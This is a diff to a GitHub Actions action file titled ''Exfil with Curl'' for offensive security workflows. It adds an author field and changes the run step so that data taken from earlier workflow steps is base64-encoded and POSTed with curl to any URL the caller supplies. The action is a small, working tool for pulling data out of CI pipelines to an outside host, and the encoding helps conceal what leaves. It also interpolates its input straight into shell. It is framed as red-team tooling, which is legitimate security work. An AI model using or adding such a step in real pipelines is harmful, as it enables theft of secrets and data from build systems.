@@ -1,5 +1,6 @@
 name: '"Exfil with Curl" Action for Offensive Security Workflows'
 description: 'Takes inputs from previous steps and uses curl to POST the content to a url'
+author: nopcorn
 
 inputs:
   url:
@@ -15,4 +16,8 @@ runs:
     - name: POST with curl
       shell: bash
       run: |
-        curl -X POST -H "Content-Type: application/json" -d "${{ inputs.data }}" "${{ inputs.url }}"
+        tmp=$(cat <<EOF 
+          ${{ inputs.data }}
+        EOF
+        );
+        curl -X POST -H "Content-Type: application/json" -d "$(echo $tmp | base64 -w 0)" "${{ inputs.url }}"
